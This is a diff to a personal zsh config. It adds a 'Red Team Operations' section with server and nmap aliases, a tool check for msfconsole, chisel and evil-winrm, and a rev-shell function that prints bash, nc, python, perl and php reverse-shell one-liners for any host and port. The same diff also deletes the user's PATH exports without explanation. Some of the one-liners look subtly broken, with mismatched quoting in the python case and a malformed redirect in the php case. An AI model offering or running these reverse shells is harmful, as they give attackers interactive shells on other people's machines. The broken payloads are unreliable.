@@ -2,7 +2,7 @@
 # see /usr/share/doc/zsh/examples/zshrc for examples
 
 setopt autocd              # change directory just by typing its name
-#setopt correct            # auto correct mistakes
+setopt correct            # auto correct mistakes
 setopt interactivecomments # allow comments in interactive mode
 setopt magicequalsubst     # enable filename expansion for arguments of the form ‘anything=expression’
 setopt nonomatch           # hide error message if there is no match for the pattern
@@ -177,8 +177,62 @@ if [ -f /usr/local/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
     ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#999'
 fi
 
-# PATH Updates
-export PATH=$PATH:/Users/michaelmiles/Library/Python/2.7/bin
-export PATH=$PATH:/Users/michaelmiles/.local/bin
-export PATH="/usr/local/opt/openjdk@11/bin:$PATH"
-export PATH=$PATH:$HOME/go/bin/
+# ----------------------
+# Red Team Operations
+# ----------------------
+
+# -- Web Servers --
+# Start a simple HTTP server
+alias http-server='python3 -m http.server'
+# Start a simple HTTPS server. Requires cert.pem and key.pem.
+# Generate with: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+alias https-server='python3 -m http.server --cert-file=cert.pem --key-file=key.pem'
+
+# -- Nmap --
+# Scan top 1000 TCP ports with service and version detection
+alias nmap-top-ports='nmap -sV -sC --top-ports=1000'
+
+# -- Reverse Shells --
+# Generate reverse shell one-liners
+rev-shell() {
+    echo "Usage: rev-shell <type> <lhost> <lport>"
+    echo "Types: bash, nc, python, perl, php"
+    case "$1" in
+        bash)
+            echo "bash -i >& /dev/tcp/$2/$3 0>&1"
+            ;;
+        nc)
+            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $2 $3 >/tmp/f"
+            ;;
+        python)
+            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$2",$3));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
+            ;;
+        perl)
+            echo "perl -e 'use Socket;$i=\"$2\";$p=$3;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">\\&S\");open(STDOUT,\">\\&S\");open(STDERR,\">\\&S\");exec(\"/bin/sh -i\");};'"
+            ;;
+        php)
+            echo "php -r '$sock=fsockopen(\"$2\",$3);exec(\"/bin/sh -i <\\&3 >\\&3 2\\&3\");'"
+            ;;
+    esac
+}
+
+# -- Prompt --
+# Show tun0 IP in prompt
+get_tun0_ip() {
+    ip addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+'
+}
+
+PROMPT+='%(?.%F{red}%B$(get_tun0_ip)%b%F{reset})'
+
+
+# -- Tool Check --
+# Check for the presence of common red team tools
+check_tools() {
+    tools=("nmap" "msfconsole" "chisel" "socat" "bloodhound" "gobuster" "feroxbuster" "impacket-smbserver" "evil-winrm")
+    for tool in "${tools[@]}"; do
+        if ! command -v $tool &> /dev/null; then
+            echo "$tool is not installed. Consider installing it."
+        fi
+    done
+}
+
